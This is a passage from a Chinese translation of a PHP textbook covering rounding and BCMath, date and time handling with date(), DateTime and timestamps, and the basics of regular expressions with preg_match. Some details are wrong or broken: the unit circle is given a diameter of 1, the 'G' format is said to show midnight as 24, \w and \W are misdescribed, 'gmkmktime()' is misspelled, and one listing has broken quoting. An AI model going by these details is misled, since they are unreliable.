echo "Maximum: " . max($numbers) . "<br />";
echo "Minimum: " . min($numbers);
?>
```

清单 9.9 从数组中获取最大值和最小值（“maximal_array.php”）

> **注意**
>
> 此函数中不能同时使用数组和其他参数。

### 舍入

最重要的舍入函数是 round(number, precision)。在此处输入要舍入的数字。precision 确定小数位数。它是可选的。如果省略，PHP 会自动舍入为整数。

```
$a = 4.537;
echo round($a, 2);
```

结果为 4.54 的舍入数值。

以下函数也以较窄或较广义进行舍入：

- floor(number) 返回浮点数的下一个最小整数：

```
$a = 4.537;
echo floor($a);
```

这些行因此提供 4。

- ceil(number) 给出浮点数的下一个最大整数：

```
$a = 4.439;
echo ceil($a);
```

这些行因此提供 5。

- abs(number) 返回数字的绝对值。因此负值变为正值。该函数不更改小数位数：

```
$a = -4.3;
echo abs($a);
```

这些行因此提供 4.3。





### 9.1.6 弧度与更多

弧度制表示的是角度在单位圆（直径为 1）上所对应的圆周弧长。PHP 还提供了两个辅助函数来进行这个非常简单的转换：

- rad2deg(radian measure) 将弧度制转换为角度。
- deg2rad(deg) 将角度转换为相应的弧度制。

除了弧度，PHP 自然也拥有三角函数计算所需的所有函数：sin(value) 用于正弦，cos(value) 用于余弦，tan(value) 用于正切。参数值始终以弧度给出。

> **提示**
> 本书篇幅有限，无法介绍几何知识。如果您需要解决特定问题，我们建议使用一本旧的数学教材以及笔和纸。

### 9.1.7 更高精度

普通数学函数以及算术运算符——就像 PHP 中的变量一样——不支持小数位的任意精度。但有一个名为 BCMath 的扩展，其名称中的 bc 代表二进制计算器。其函数在内部使用字符串工作，因为这是实现高精度的唯一方法。

### 安装

在使用 BCMath 函数之前，您应确保其已正确安装。最简单的方法是使用 phpinfo()，如图 9.4 所示。在所有现代 PHP 版本中，这默认已自动启用，因此大多数 Web 服务器上也安装了这些函数。

![](img/ae7820c36e8f24c1623d26668b28e80e_274_0.png)

图 9.4 使用 "phpinfo()" 检查 BCMath 是否已安装

### 设置

您可以决定 BCMath 如何进行计算。PHP 提供了三个选项：

- 主要设置位于 php.ini 中。

```
bcmath.scale = 0
```

这指定了所有二进制计算器函数的小数位数。默认设置为 0 表示计算不带小数位。您可以在此处更改该值。

- 或者，您可以使用 bcscale(precision) 函数为脚本设置精度。

- 第三个选项是为每个 BCMath 函数的最后一个（可选）参数指定精度（bcadd(number1, number2, precision)）。

### 应用

使用这些函数现在非常简单。请参考以下简单示例；图 9.5 显示了结果。

```
<?php
$a = 4.537;
$b = 5.3429;
echo bcadd($a, $b, 3);
?>
```

清单 9.10 "bcadd()" ("bc_functions.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_275_0.png)

图 9.5 相加时，第二个数字的第四位小数会被忽略

> **注释**
> 超出指定精度的小数位数会被简单地忽略。

除了 bcadd()，还有几个其他 BCMath 函数。例如，基本算术运算：

- bcsub(number1, number2) 用于减法
- bcmul(number1, number2) 用于乘法
- bcdiv(number1, number2) 用于除法
- bcmod(number1, number2) 用于取模

以及一些用于更复杂计算和比较的函数：

- bccomp(number1, number2) 用于比较两个数字
- bcpow(base, exponent) 用于幂运算
- bcpowmod(base, exponent, modulo) 用于随后进行模除的幂运算
- bcsqrt(number) 用于数字的平方根

## 9.2 日期和时间

PHP 拥有多个函数，并与 DateTime 一起提供一个对象来返回和处理日期值。这使得整体略显混乱。为了带来秩序，本节按不同用例进行组织。

### 9.2.1 使用函数获取当前日期

*当前日期*始终指的是服务器端编程语言（如 PHP）中服务器的日期。您可以使用两个非常强大的函数来获取此日期：

- getdate() 以关联数组形式返回当前日期。
- date(Format) 在您指定的格式中返回当前日期。
- 第三个选项是 DateTime 对象。它以面向对象的形式返回日期（请参见下一节）。

> **注释**
> _注意:_ 如果您的服务器位于欧洲，那么美国的时间当然是不正确的！所有日期函数都使用服务器时间。

#### "getdate()"

getdate() 以关联数组形式返回当前日期。日期的所有元素，包括星期几、月中的日期、月份、年份等，都是数组中的单独元素。请仔细查看数组：

```
var_dump(getdate());
```

图 9.6 显示了单个日期的索引。然后通过索引访问单个条目（请参见图 9.7）。

```
<?php
$today = getdate();
echo "We are writing the year ". $today["year"] . ". ";
?>
```

清单 9.11 "getdate()" ("getdate_access.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_277_0.png)

图 9.6 关联数组的单个元素

![](img/ae7820c36e8f24c1623d26668b28e80e_277_1.png)

图 9.7 单独输出年份

> **注释**
> 在许多编程语言中，月份从 0 开始。这些及其他障碍在 PHP 中不存在。就此而言，处理数组元素无需任何解释。星期几（weekday）和月份（month）的返回值有些问题。索引为 0 的元素包含自 1970 年 1 月 1 日 00:00:00 UTC Unix 纪元开始以来经过的秒数。以后您需要考虑此信息。

#### "date()"

date(Format) 函数默认也返回一个日期。但是，您可以使用字符串自行确定格式。在此字符串中，某些符号确保输出日期的元素：d 代表日期（前面带 0），m 代表月份（作为带 0 的数字），Y 代表四位年份。图 9.8 显示了输出。

```
<?php
$today = date("m/d/Y");
echo $today;
?>
```

清单 9.12 "date()" ("date.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_278_0.png)

图 9.8 格式清晰的当前日期

日期各元素之间的斜杠会由 date() 直接输出。如果您要输出实际对应日期元素的某个符号，则必须用反斜杠（\）（也称为转义字符）对其进行转义。但要小心：格式

```
$today = date("\D\a\t\e: d.m.Y");
```

仅输出 Da : 27.12.2024，因为 \t 是制表符，\e 在字符串中是转义字符。您应该改为：

```
$today = date("\D\a\t\e\\t\e: d.m.Y");
```

因此 date() 不适合较长的文本。在这里，您可以使用 DateTime、多次 date() 调用，或 getdate() 的关联数组。

表 9.2 提供了所有可用符号及其相应说明的列表。

表 9.2 "date()" 的格式说明

| Icon | Examples | Description |
| :--- | :--- | :--- |
| a | am, pm | _am_ 和 _pm_ 或，用完整的拉丁语来说，_ante meridiem_ 和 _post meridiem_。 |
| A | AM, PM | 大写的 _AM_ 和 _PM_。 |
| B | 045 | _Swatch Internet Time_，其中一天包含 000 到 999 的 1,000 个 _beats_。000 是瑞士 Swatch 总部的午夜。这种时间系统的目的——除了营销之外——是为聊天、预约等创建一个标准化的时间系统。 |
| c | 2025-02-21T23:08:28+01:00 | ISO 8601 日期。 |
| d | 09 | 月份中的日期。始终为两位数。个位数日期前面的零会自动添加。 |
| D | Wed | 星期几的三个字母英文简称。 |
| e | Europe/Berlin | 当前时区的名称。 |
| F | January, July | 英文中的月份。 |
| g | 5 | 12 小时格式中的小时。因此午夜是 12 点。上午和下午的区分通过 am 和 pm（符号 a 和 A）来实现。它前面没有零。 |
| G | 5, 15 | 24 小时格式中的小时。因此午夜是 24 点。个位数小时前面不加零。 |
| h | 05 | 与 g 相同，但个位数小时前会自动添加零。 |
| H | 05, 23 | 与 G 相同，但个位数小时前会自动添加零。 |
| i | 05, 43 | 分钟，个位数分钟前面加零。 |
| I | true, false | 如果日期处于夏令时，则返回 true，否则返回 false。 |
| j | 9 | 月份中的日期，没有前面的零。 |
| l | Monday | 英文中的星期几。 |
| L | true, false | 如果年份是闰年，则返回 true，否则返回 false。 |
| m | 08 | 月份作为数字，个位数月份前面加零。 |
| M | Mar | 月份名称的三个字母英文简称。 |
| n | 8 | 月份作为数字，没有前面的零。 |





| Icon | Examples | Description |
|---|---|---|
| N | 7 | ISO 8601 星期的数字表示（1 代表周一，7 代表周日）。 |
| o | 2025 | ISO 8601 年份数字（与 Y 类似，但年份变更与 01.01. 无关，而是与格式说明 W 的 ISO 周变更相关）。 |
| O | +0100 | 与格林威治标准时间（GMT）的时差（小时）。例如，德国在夏令时的时差为 +0100 或 +0200。 |
| P | +01:00 | 与 GMT 的时差（类似 O，但小时和分钟之间带有冒号）。 |
| r | Fri, 11 Jul 2025 16:06:07 +0100 | 符合 IETF 指定的 RFC 2822 标准的特殊格式日期（www.ietf.org/rfc/rfc2822.txt）。 |
| s | 09, 45 | 带前导零的秒数。 |
| S | st, nd, rd, or th | 月份日期的英文后缀（与 j 一起输出）。 |
| t | 28, 29, 30, 31 | 指定月份的天数。 |
| T | 西欧标准时间 | 当前时区。 |
| u | 0000 | 毫秒；date() 始终返回 0000，但 DateTime::format() 返回实际毫秒，因为 date() 仅使用 int 时间戳计算。 |
| U | 1089466808 | 自 Unix 纪元开始（1970 年 1 月 1 日 00:00:00 GMT）以来的秒数。Unix 时间戳。 |
| w | 3（周三） | 星期几，范围为 0（周日）到 6（周六）。 |
| W | 33 | 年份中的周数。周从周一开始（与 w 不同，符合 ISO 8601）。 |
| Y | 1978, 2022 | 四位数形式的年份。 |
| y | 78（1978 年），05（2005 年） | 两位数形式的年份。 |
| z | 191 | 一年中的天数，从 0（1 月 1 日）编号到 364（12 月 31 日）或 365（闰年的 12 月 31 日）。 |
| Z | 7200 | 时区偏移量（秒）。 |

### 9.2.2 使用 "DateTime" 获取当前日期

DateTime 是处理日期的面向对象变体。此对象可作为 date() 的替代品，多年来一直是处理日期的主要工具。

> **注意**
>
> DateTime 对象名称的由来颇具趣味。它最初在 PHP 5.1 中称为 Date 对象。但由于与同名 PEAR 类的命名空间冲突，在 PHP 5.1.1 中被移除。PHP 开发者邮件列表（http://news.php.net/php.internals/20324）上的激烈讨论导致该对象被重命名为 DateTime，并自 PHP 5.2 起再次可用。

要使用 DateTime 创建新日期，请使用 new 实例化对象：

```
$date = new DateTime();
```

要以格式化形式输出日期，请使用 format() 方法。format() 的选项基于 date()。使用清单 9.13 中的行，您可以按数字形式输出日期，如图 9.9 所示。

```
<?php
$today = new DateTime();
echo $today->format('m/d/Y');
?>
```

清单 9.13 "DateTime" 对象（"datetime.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_281_0.png)

图 9.9 "DateTime" 的日期输出

作为面向对象风格的替代方案，DateTime 也可以以过程式使用。但在实践中这很少见。请参考以下示例。

```
<?php
$today = date_create();
echo date_format($today, 'm/d/Y');
?>
```

清单 9.14 过程式风格中的 "DateTime" 对象（"datetime_procedural.php"）

DateTime 有一个单独的接口：DateTimeInterface，它定义了所使用的常量和方法。

### 9.2.3 任意日期值

当前日期只是您可以使用的日期之一。要获取任意日期，可以向 DateTime(日期值, 时区) 传递两个参数。第一个代表日期本身，第二个代表时区。支持多种日期值：

- 例如 now（当前时间）、tomorrow（明天）和 yesterday（昨天）等术语。
- 格式为 2015-7-20 或 2015-07-20 的日期。
- 所谓的时间戳。时间戳以秒为单位表示自 1970 年 1 月 1 日 0 点以来的日期，这也称为 Unix 时间戳。要识别时间戳，它必须以 @ 开头。

以下示例使用包含日期和时间的字符串。一个新的 DateTimeZone 对象用作时区，其值为中欧时间 CET（参见图 9.10）。

```
<?php
$date = new DateTime('2022-7-20 12:00:00', new DateTimeZone('Europe/Berlin'));
echo $date->format('m/d/Y H:i:sP');
?>
```

清单 9.15 带有任意日期值的 "DateTime" 对象（"datetime_any_date.php"）

可能的时区值概述可在 http://s-prs.co/v602271 上找到。如果日期字符串中已指定时区（带 + 或 - 和小时值）或指定了时间戳，则 DateTime 会忽略第二个参数中的时区说明。

![](img/ae7820c36e8f24c1623d26668b28e80e_282_0.png)

图 9.10 单独的日期

### 9.2.4 时间戳

如果需要当前时间或日期的时间戳，可以使用 time() 方法：

```
$current = time();
```

microtime() 函数也返回当前时间的时间戳，但以自 Unix 时间以来的微秒为单位。此计量单位在其他一些编程语言中可以找到。但在 PHP 中，以秒为单位的时间戳是标准。

使用 DateTime，可以通过 getTimestamp() 方法获取时间戳。与 time() 和 microtime() 不同，这也适用于任何日期值。但是，返回值仍然仅以秒为单位，而非微秒。图 9.11 显示了相应结果。

```
<?php
$date = new DateTime();
echo $date->getTimestamp();
echo '<br />'; echo microtime();
echo '<br />';
echo time();
?>
```

清单 9.16 创建时间戳（"timestamp.php"）

转换为时间戳的另一种选择是 mktime(小时, 分钟, 秒, 月, 日, 年, 夏令时) 函数，它将日期转换为 Unix 时间戳。该函数先接受时间，再接受日期作为参数。最后一个参数指定当前是夏令时（值 1）还是冬令时（0）。默认值为 -1，即 PHP 会自行判断当前是夏令时还是冬令时。参数顺序是强制性的。如果省略末尾参数，则使用系统的当前日期。

![](img/ae7820c36e8f24c1623d26668b28e80e_283_0.png)

图 9.11 不同方法的时间戳

您也可以为 getdate() 和 date() 指定任意日期。将此日期作为函数的最后一个参数。在以下示例中，指定了一个日期，然后使用 date() 读取该日期的星期几。

```
<?php
$timestamp = mktime(0, 0, 0, 4, 18, 1978);
$weekday = date("l", $timestamp);
echo "The birthday was a " . $weekday;
?>
```

清单 9.17 创建时间戳（"any_date.php"）

> **注意**
>
> 负日期值在某些 Windows 系统和某些 Linux 系统上不适用。这意味着您只能将 1970 年 1 月 1 日及之后的日期表示为时间戳。更早的日期必须作为字符串处理。以下日期会导致错误：
>
> $timestamp = mktime(0, 0, 0, 11, 2, 1907);
>
> 另一个限制是 Fri, 13 Dec 1901 20:45:54 GMT。在此日期中，PHP 用于存储值的负 32 位整数已满，因此无法设置更早的日期。顺便说一句，这也适用于未来：Tue, 19 Jan 2038 03:14:07 GMT 是该处的限制。但是，这些限制不适用于 64 位系统。

## 日期作为字符串

您经常以字符串形式读取日期或将其组装为字符串。这主要发生在从用户表单输入创建日期时。对此也有多种选择。您已经知道一种：将字符串传递给 DateTime。但还有一个专门的 createFromFormat() 方法。使用此静态方法，您可以从指定格式的字符串中创建 DateTime 对象。格式的参数在很大程度上与 date() 的参数相同（参见表 9.2）。

以下示例从英文字符串创建日期；相应输出可见于图 9.12。

```
<?php
$date = DateTime::createFromFormat('F d Y', 'July 18 2014');
echo $date->format('m/d/Y') . '<br />';
echo $date->getTimestamp() . '<br />';
$weekday = $date->format('l');
echo "The birthday was a " . $weekday . ".";
?>
```

清单 9.18 带有 "createFromFormat()" 的 "DateTime"（"datetime_createFromFormat.php"）





![](img/ae7820c36e8f24c1623d26668b28e80e_285_0.png)

## 图 9.12 格式化日期、时间戳和日期的一部分

**注意**
一个类似且有时有用的函数是 `date_parse_from_format()`。它允许指定一个格式，并将包含日期的字符串作为第二个值。这随后会变成一个带有日期组件的关联数组。

另一个选项是辅助函数 `strtotime(date, reference)`，它会自动将英文格式的日期转换为时间戳。您可以选择指定一个作为时间戳的参考时间。这会补全任何缺失的信息。

现在的问题是哪些数据被正确转换。请考虑以下简单的测试脚本，其输出您可以在图 9.13 中看到。

```php
<?php
$date = " July 18 2014";
$timestamp = strtotime($date);
echo $timestamp . "<br />";
$weekday = date("l", $timestamp);
echo "The birthday was a " . $weekday . ".";
?>
```

## 清单 9.19 “strtotime()” (“strtotime.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_285_1.png)

## 图 9.13 时间戳和日期的一部分

作为真实日期的替代方案，还可以使用以下类型的引用：

```
$date = "last Sunday";
```

这例如指上个星期日。

> > **注意**
> >
> > 所幸有一套系统：`strtotime()` 中可能日期规范的语法遵循 GNU 准则。您可以在 `http://s-rs.co/v602213` 找到这些准则。对之前或即将到来的工作日的引用在那里汇总——例如，在 **7.7 日期字符串中的相关项** 下。

## 数据的有效性

当今使用的公历<sup>1</sup>往往有些复杂。尤其是闰年的概念常常引起一些混淆。通过 `checkdate(month, day, year)`，PHP 提供了一个检查函数。它需要所有三个参数，然后检查日期是否为正确的公历日期。

该函数了解三个条件，对于有效日期返回 `true`：

- 年份必须在 1 到 32767 之间。公元前的年份无法计算。当然，这种方法对于公历引入之前的日期来说意义不大，因为它也会为该时期计算闰年。
- 月份必须在 1 到 12 之间。
- 该天数必须在该年份的月份中存在。

该函数对 1900 年或 2000 年不会失效。1900 年不是闰年，因为 1900 可被 100 整除——但 2000 年是闰年，因为它可被 400 整除。<sup>2</sup>

```php
<?php
$day = 29;
$month = 2;
$year = 2000;
if (checkdate($month, $day, $year)) {
echo "Valid!";
} else {
    echo "Oops, $year is unfortunately not a leap year!";
}
?>
```

<sup>1</sup> 我们的日历最初由盖乌斯·朱利叶斯·凯撒创建，他是终结罗马共和国的将军和执政官。然而，以他命名的儒略历有一些弱点，这些弱点最终在 1582 年由教皇格里高利十三世在天文学家利利乌斯的支持下，通过公历加以解决。

<sup>2</sup> 儒略历的一年长度为 365.25 天（通常为 365 天；每四年 366 天）。由于这在天文上并不完全正确，因此出现了偏移。教皇格里高利十三世取消了 1582 年 10 月 5 日至 10 月 14 日（包含首尾两天）之间的日期，然后引入了以下规则：所有可被 100 整除的年份都不是闰年。然而，由于这也需要稍作修正，可被 400 整除的年份毕竟是闰年。

## 清单 9.20 "checkdate()" ("checkdate.php")

前面的脚本正确地返回 Valid!。

### 9.2.5 格式化日期

在大多数情况下，您、您的数据库或您网站的用户对日期应该是什么样子有特定的想法。您可以使用 DateTime 和 format() 轻松实现这一点，也可以使用 date() 和 getdate()。接下来，您将找到一些示例和技巧，了解如何快速格式化日期。

### "strftime()"

strftime(format, timestamp) 函数按给定格式格式化任意日期。如果未指定时间戳，则像往常一样使用当前日期。注意，该函数自 PHP 8.1 起已弃用。

> **提示**
> strftime() 的对应函数是 strptime()。它将由 strftime() 生成的日期转换为数组。

strftime() 在后台与 C 库协同工作。<sup>3</sup> 各个元素的缩写始终以 % 开头。不幸的是，这些名称与 date() 中的名称差异很大。

例如，以下行显示完整的月份名称：

```
echo strftime("%B");
```

> **注意**
> 根据所使用的 C 库，不同系统之间可能存在差异。PHP 函数参考揭示了共同点（http://s-prs.co/v602272）；否则，您可以在相应 C 库的参考中找到更多信息。例如，对于 Windows，请参见 http://s-prs.co/v602214。

<sup>3</sup> 这很容易解释：PHP 是用 C 编程语言编写的，因此也使用 C 库并采用一些特殊功能。

### "setlocale()"

如果使用 strftime() 格式化日期，也可以使用特殊的本地时间设置。setlocale(category, local setting) 函数为特定类别设置一个或多个本地设置。类别可以是小数分隔符 (LC_NUMERIC)、全部 (LC_ALL) 或时间 (LC_TIME)。作为本地设置，例如对于德语区输入 de_DE。您可以用逗号分隔多个条目，或将它们放入数组中。以下示例输出德语月份（参见图 9.14），其中本地设置用逗号分隔。

```php
<?php
setlocale(LC_TIME, "de_DE", "de", "ge");
echo strftime("In month %B");
?>
```

## 清单 9.21 "setlocale()" ("setlocale.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_288_0.png)

## 图 9.14 使用 "setlocale()" 输出德语月份 —— 但使用了已弃用的函数 strftime()

> **注意**
> 
> 使用 date_default_timezone_get() 可以读取默认时区，并使用 date_default_timezone_set() 设置默认时区。

### "idate()"

idate(format, timestamp) 函数返回日期的一个元素。因此，您只能为 format 指定一个缩写。这个缩写来自 date() 的列表。然而，idate() 只使用那些返回整数的缩写。这正是 idate() 的特殊之处——因此 date() 前面有 i（代表 integer）：

```
echo idate("m");
```

与 date() 一样，您可以在 idate() 中使用时间戳或省略它。

### GMT

GMT 代表格林威治标准时间。其他时区的日期始终使用时差进行计算。因此，部分日期函数也专门提供用于在没有时偏移的情况下使用 GMT。如果您想手动处理时差，这些函数非常重要。可用的函数如下：

- gmkmktime() 生成一个时间戳。
- gmdate() 返回日期并允许格式字符串。
- gmstrftime() 使用来自 C 的格式字符串进行格式化。

这些函数的参数和结果与与 GMT 无关的原始函数相同。

### 9.2.6 倒计时：使用日期进行计算

试着计算两个日期之间经过了多少时间。好吧，从元旦到除夕太简单了——但一旦时间跨度超过几年，就必须考虑闰年，否则精确到秒时，我们的数学小脑就会失效。

要通过 PHP 使用日期进行计算，您需要一个基准。这个基准是 1970 年 1 月 1 日 00:00:00 的时间戳。您可以用它来简单地相互减去或相加日期。结果始终是以秒为单位的差值。然后您可以将这些秒转换为任何想要的单位。

以下示例显示一个表单，它从用户输入的日期中减去当前日期。然后以整天显示结果。您可以在图 9.15 和图 9.16 中看到表单和结果。

```php
<?php
if (isset($_POST["submit"])) {
	$date1 = strtotime($_POST["input"]);
	$date2 = time();
	$result = $date1 - $date2;
	if ($result > 0) {
		echo "Still ". floor($result / (60 * 60 * 24)) . " days ";
		echo "until ". date('m/d/Y', $date1);
	} else {
		echo "Your date is not in the future!";
	}
}
?>
```





```html
<html>
<head>
<title>Final Countdown</title>
</head>
<body>
<form method="POST">
<input type="text" name="input" />
<input type="submit" name="submit" value="How much longer?" />
</form>
</body>
</html>
```

## 清单 9.22 一个简单的倒计时 ("countdown.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_290_0.png)

## 图 9.15 距 2028 年 7 月 3 日还有多久？

![](img/ae7820c36e8f24c1623d26668b28e80e_290_1.png)

## 图 9.16 还剩几天……

这是倒计时最简单的示例。当然，你首先应该添加检查用户是否以正确格式输入日期的函数。

> **提示**
> 
> 在实践中，将日、月、年分别放在不同的表单元素中进行查询已被证明很有用。如果它们都已经指定，则最安全。然后你只需筛选掉无效的日期。例如，可以使用 checkdate()。

如果希望日期更具色彩，可以使用图片创建倒计时。只需要 0 到 9 的数字图片。最好给这些图片起个聪明的名字——例如，_0.gif_ 到 _9.gif_——然后根据数字插入对应的图片。以下示例显示了倒计时文件中所需的更改。

```
if ($result > 0) {
    $days = str_split(floor($result / (60 * 60 * 24)));
    echo "Still ";
    for ($i = 0; $i < count($days); $i++) { echo
    "<img src="" . $days[$i] . ".gif" />";
    }
    echo "until " . date('m/d/Y', $date1);
} else {
    echo "Your date is not in the future!";
}
```

## 清单 9.23 带图形的倒计时（《countdown_images.php》摘录）

计算结果被拆分为一个数组。然后 `for` 循环遍历数组，为每个位置输出带有对应数字的图片（见图 9.17）。数字来自包含各个数位的数组。

![](img/ae7820c36e8f24c1623d26668b28e80e_291_0.png)

## 图 9.17 带图形的显示

> **提示**
> 
> 带连续动画的倒计时是客户端技术（如 JavaScript）的任务。为什么呢？使用 PHP 等服务器端语言时，倒计时的每次更新都需要重新传输数据。然而，在客户端，倒计时可以每秒跳动一次。

实现倒计时的另一种方法是再次使用 `DateTime` 对象，并使用 `diff(DateTime, Absolute)` 方法。首先，必须将两个日期值转换为 `DateTime` 对象，然后可以将第一个对象作为第二个对象中 `diff()` 方法的参数。第二个参数是可选的。如果将其设置为 `true`，则返回值始终为正数，即使要比较的日期在过去。

`diff()` 的结果是一个 `DateInterval` 对象。它在单独的属性中包含两个日期值之间的差异：y 代表年，m 代表月，d 代表日，h 代表小时，i 代表分钟，s 代表秒。

不过，在我们的例子中，我们想要总的天数，而不希望从年份中计算得出。有一个单独的 `days` 属性用于此目的，但只有当 `DateInterval` 是通过 `diff()` 方法创建时，该属性才会被填充。

要检查倒计时日期是否在将来，可以将两个 `DateTime` 对象相互比较。可用于此目的的经典比较参数包括 `==`、`<` 和 `>`。

```php
<?php
if(isset($_POST["Submit"])) {
    $date1 = new DateTime($_POST["input"]);
    $date2 = new DateTime();
    $diff = $date2->diff($date1);
    if ($date1 > $date2) {
        echo "Still " . $diff->days . " days ";
        echo "until " . $date1->format('m/d/Y');
    } else {
        echo "Your date is not in the future!";
    }
}
?>
```

## 清单 9.24 带“DateTime”的倒计时（《countdown_datetime.php》摘录）

> **提示**
> 
> 除了 `diff()` 之外，`DateTime` 还提供 `add()` 和 `sub()` 等方法，用于向日期添加或从日期减去天数、月数、年数等等。`modify()` 还允许指定字符串值，例如 `'+2 days'`。

# 第 10 章

# 正则表达式

*正则表达式是处理字符串的终极手段。正则表达式是一种模式，可用于比较和编辑字符串。*

PHP 中的正则表达式最初源自 Perl 编程语言。在实践中，它们主要用于简单的等效性检查等无法覆盖的字符串验证和搜索。因此，在介绍基础知识和函数概述后，你还将找到一些应用示例，例如邮政编码、电话号码和链接的过滤。

> **注意**
> 
> 在 PHP 中，长期以来存在第二种正则表达式（RegEx）：POSIX。1 此类型源自 Unix 命令行中的正则表达式。它们曾与 ereg.* 函数一起使用，但自 PHP 5.3 起不再推荐，并在 PHP 7 中被删除。

## 10.1 基础知识

如前所述，正则表达式是可用于识别区域或整个字符串的模式。这些模式遵循某些规则，并使用元字符来表示某些模式。我们在此介绍模式和元字符的基础知识。

> **注意**
> 
> 本章主要介绍 PHP 函数，只能奠定正则表达式的基础。有关更多信息，我们推荐 Jeffrey E. F. Friedl 所著的 *精通正则表达式*（O'Reilly, 2006）。

此处总结了最重要的信息：

- 数字和字母对应其自身。
  - a
  - 因此期望 a 作为一个组件。

1 POSIX 代表 *可移植操作系统接口*。POSIX 标准包含正则表达式的规范等内容。

- 某些字符在正则表达式中具有特殊含义。这些包括以下元字符：

- `[][{}()^*$+-. ?`

- 元字符使用反斜杠 (`\`) 进行转义。

- `\\` 因此使反斜杠失效。这意味着字符串中此处恰好有一个反斜杠。

- `^` 代表模式的开头；`$` 表示结尾。

- 如果到达单词的开头或结尾，`\b` 返回 true。`\B` 是其对应项，如果不是单词边界，则返回 true。

- 字符组（即多个字符的选择）可以放在方括号（[ ]）中组合在一起。

- 如果存在字母 A、D 或 Z，`[ADZ]` 会识别该模式。你还可以指定范围——例如，

- `[a-z]`

用于所有小写字母，或

- `[a-zA-Z0-9]`

用于所有小写和大写字母及数字。

- 点号 (`.`) 代表任何字符。

- 字符类代表某些字符类型：`\w` 代表所有 ASCII 字符（w 来自 word），`\d` 代表所有数字（d 来自 digit），`\s` 代表空白字符（包括制表符和空格）。

- 也可以排除字符类。为此，只需使用大写字母代替小写字母。例如，`\W` 排除所有 ASCII 字符但允许数字。`\D` 排除数字，`\S` 排除空白字符。

- 如果要排除某些字符，请在方括号中写入 `^`：

- `[^ADZ]`

排除 A、D 和 Z。

- 花括号 (`{}`) 定义字符出现的次数。

- `\d{5}`

表示出现五个数字。如果整个字符串受到限制，如下所示：

- `^\d{5}$`

这已经是检查最小美国邮政编码的正则表达式。不过，你也可以在花括号中指定最小和最大出现次数：

```
\w{2, 4}
```

例如，许多顶级域名允许出现两到四次（虽然现在也有更长的顶级域）。如果省略两个最小值/最大值中的一个，则表示至少或至多。

```
\d{, 8}
```

表示最多八个数字。这里的一般规则是表达式是 *贪婪* 的，也就是说，如果可用，始终选择最大值。

- 频率有一些简写形式：

- `?` 代表没有或单次出现（对应 `{0, 1}`）。
- `+` 代表单次或多次出现（对应 `{1, }`）。
- `*` 代表任意次出现（对应 `{0, }`）。

括号用于总结元素。如果有多个备选方案，它们很有用。使用垂直线 (`|`) 分隔备选方案：

```
(com|org)|\w{4}
```

前面的检查对 com、org 以及任何四个字母的组合返回 `true`。

括号的内容可以在输出的其他位置调用。为此，请使用 `\number`，其中 `number` 代表括号的位置。第一个括号是 `\1`，第二个是 `\2`，以此类推。

## 10.2 正则表达式函数

本节概述了 PHP 中正则表达式的各种函数和可能性。

### 10.2.1 "preg_match()"

检查正则表达式的最简单方法是使用函数 `preg_match(Regex, String)`。第一个参数是正则表达式；第二个参数是要应用的字符串。

如果正则表达式匹配（即在字符串中找到），函数返回 1；否则返回 0。

> **注意**
> 
> 仅在出错时，`preg_match()` 才会返回 `false`（一个布尔值）。因此，在检查返回值时应格外小心。最好使用 `===` 进行严格相等比较。




正则表达式必须用两个相同的简单符号括起来。默认情况下，该符号是斜杠（/）。或者，也可以使用 ( ) 等成对括号。如果该符号也在正则表达式中使用，则必须用反斜杠（\）对其进行转义。

下面示例中的正则表达式用于检查字符串是否为上一个世纪和当前世纪的正确日期，格式为 MM/DD/YYYY。同时还考虑到天和月只能用一位数字表示的情况。在此示例中，返回值为 1，因为这是一个正确日期，且字符串中找到了定义的格式。

```php
<?php
$date = "03/02/2028";
$reg = "/^(0?[1-9]|1[0-2])\/(0?[1-9]|[12]\\d|3[01])\/((19|20)?\\d{2})$/";
print preg_match($reg, $date);
?>
```

### 清单 10.1 “preg_match()” (“preg_match.php”)

使用 `preg_match(RegEx, String, Variable)`，可以将变量指定为第三个参数，该变量随后将字符串的各个部分作为数组获取。

```php
<?php
$date = "03/30/2028";
$reg = "/^(0?[1-9]|1[0-2])\/(0?[1-9]|[12]\\d|3[01])\/((19|20)?\\d{2})$/";
if (preg_match($reg, $date, $parts)) {
    print $parts[2] . ". . " . $parts[1] . ". . " . $parts[3];
}
?>
```

### 清单 10.2 带变量的 “preg_match()” (“preg_match_parts.php”)

在此示例中，变量 `$parts` 是一个数组。第一个索引 0 包含所有组件；从 1 开始是括号。顺便说一下，这与正则表达式中的规范相符，你也可以通过 `\1` 访问第一个括号。

`preg_match(RegEx, String, Variable, Mode, Start_Position)` 将 `Mode` 识别为第四个选项，`Start_Position` 作为第五个选项。`Mode` 只能有一个值——即 `PREG_OFFSET_CAPTURE`。如果激活了该模式，则不仅返回变量数组中的位置，还返回位置（参见图 10.1）：

```php
$text = "Hello all!";
$reg = "//";
preg_match($reg, $text, $parts, PREG_OFFSET_CAPTURE);
```

![](img/ae7820c36e8f24c1623d26668b28e80e_297_0.png)

图 10.1 带有位置和字符串中位置的数组

第四个参数“字符串位置”定义了搜索开始的字符串或位置。请考虑修改后的示例：

```php
$text = "Hello all!";
$reg = "/ll/";
preg_match($reg, $text, $parts, PREG_OFFSET_CAPTURE, 5);
```

该正则表达式找到了第二个出现的 `ll`，因为它仅从字符串的第五个位置开始搜索。图 10.2 显示了结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_297_1.png)

图 10.2 此处可见起始位置 7

`preg_match()` 只会查找搜索字符串的第一个出现项。更灵活的选项是 `preg_match_all()`。其输出如图 10.3 所示。

```php
<?php
$text = "Hello all!";
$reg = "/ll/";
preg_match_all($reg, $text, $parts, PREG_OFFSET_CAPTURE);
print_r($parts);
?>
```

### 清单 10.3 "preg_match_all()" ("preg_match_all.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_297_2.png)

图 10.3 "preg_match_all()" 查找了两个出现项

但是，`preg_match_all(RegEx, String, Variable, Mode)` 的 `Mode` 有其他值：`PREG_PATTERN_ORDER` 和 `PREG_SET_ORDER`。你可以通过依次编写模式并用 `|` 分隔，将两者与 `PREG_OFFSET_CAPTURE` 结合使用。如果未指定，则默认值为 `PREG_PATTERN_ORDER`。找到的模式将作为数组保存在变量的第一个数组元素（索引 0）中。在第二个及后续元素中，指定了由括号划分的模式部分的位置。

